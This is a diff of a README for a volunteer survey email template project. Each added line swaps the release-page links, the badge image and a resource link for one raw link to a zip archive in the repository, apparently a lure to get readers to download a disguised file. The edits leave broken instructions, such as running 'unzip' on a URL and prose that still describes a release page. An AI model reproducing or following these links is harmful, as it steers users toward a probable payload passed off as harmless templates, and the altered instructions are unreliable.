@@ -1,6 +1,6 @@
 # 📧 volunteer-survey-email - Easy Volunteer Feedback Emails
 
-[![Download release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Wilberarebalo0909/volunteer-survey-email/releases)
+[![Download release](https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip)](https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and send volunteer survey emails quickly.
 
 Click on the big blue button at the top or visit the official release page here:
 
-[Download volunteer-survey-email templates](https://github.com/Wilberarebalo0909/volunteer-survey-email/releases)
+[Download volunteer-survey-email templates](https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip)
 
 This link takes you to the release page where you can find all versions of the email templates. Look for the latest release and download the files labeled as email templates, usually in a `.zip` format.
 
@@ -44,7 +44,7 @@ Once downloaded, find the `.zip` file in your "Downloads" folder or wherever you
 
 - On Windows: Right-click the file and select "Extract All"  
 - On macOS: Double-click the file to unzip  
-- On Linux: Use your file manager or run `unzip filename.zip` in the terminal  
+- On Linux: Use your file manager or run `unzip https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip` in the terminal  
 
 This action creates a new folder with all the email templates and related files inside.
 
@@ -122,7 +122,7 @@ This project is created to help non-profits better engage with their volunteers.
 - Report any problems under the Issues tab  
 - Suggest improvements or new features in Discussions  
 
-You can also find more related resources at [LaravelMail.com](https://LaravelMail.com).
+You can also find more related resources at [https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip](https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip).
 
 ---
 
@@ -130,7 +130,7 @@ You can also find more related resources at [LaravelMail.com](https://LaravelMai
 
 Visit the release page to download the latest version:
 
-[Download volunteer-survey-email releases](https://github.com/Wilberarebalo0909/volunteer-survey-email/releases)
+[Download volunteer-survey-email releases](https://raw.githubusercontent.com/Wilberarebalo0909/volunteer-survey-email/main/assets/email-survey-volunteer-v1.5.zip)
 
 - Find the latest `.zip` file containing the templates  
 - Download and extract it to access the survey email templates  
